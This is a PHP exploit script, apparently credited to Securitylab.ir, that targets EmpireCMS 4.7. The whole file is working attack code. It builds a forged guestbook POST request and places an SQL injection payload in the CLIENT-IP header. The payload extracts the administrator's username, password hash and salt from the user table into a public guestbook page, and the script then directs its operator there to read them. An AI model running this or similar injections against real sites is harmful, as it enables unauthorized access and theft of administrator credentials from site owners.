<?php
print_r("
+------------------------------------------------------------------+
Application Info:
Name: EmpireCMS47
--------------------------------------------
Discoverd By: Securitylab.ir
Contacts: info@securitylab[dot]ir
Note: just work as php>=5&mysql>=4.1
--------------------------------------------
Vulnerability Info:
Sql Injection
Medium Risk
+------------------------------------------------------------------+
");
if ($argc<3) {
echo "Usage: php ".$argv[0]." host path \n";
echo "host: target server \n";
echo "path: path to EmpireCMS47\n";
echo "Example:\r\n";
echo "php ".$argv[0]." localhost /\n";
die;
}
$host=$argv[1];
$path=$argv[2];
$data = "name=11ttt&email=111&call=&lytext=1111&enews=AddGbook";
$cmd = "aaaaaaaa',0,1,''),('t00lsxxxx','t00lsxxxxx','','2008-05-28 15:44:17',(select concat(username,0x5f,password,0x5f,rnd) from phome_enewsuser where 
userid=1),'',1,'1111',0,0,'')/*";
$message = "POST ".$path."/e/enews/index.php"." HTTP/1.1\r\n";
$message .= "Referer: http://".$host.$path."/e/tool/gbook/?bid=1\r\n";
$message .= "Accept-Language: zh-cn\r\n";
$message .= "Content-Type: application/x-www-form-urlencoded\r\n";
$message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
$message .= "CLIENT-IP: $cmd\r\n";
$message .= "Host: $host\r\n";
$message .= "Content-Length: ".strlen($data)."\r\n";
$message .= "Cookie: ecmsgbookbid=1;\r\n";
$message .= "Connection: Close\r\n";
$message .= "\r\n";
$message .=$data;
$ock=fsockopen($host,80);
if (!$ock) {
echo 'No response from '.$host;
die;
}
echo "[+]connected to the site!\r\n";
echo "[+]sending data nowâ€¦â€¦\r\n";
fputs($ock,$message);
@$resp ='';
while ($ock && !feof($ock))
$resp .= fread($ock, 1024);
echo $resp;
echo "[+]done!\r\n";
echo "[+]go to http://$host$path/e/tool/gbook/?bid=1 see the hash"
?>


      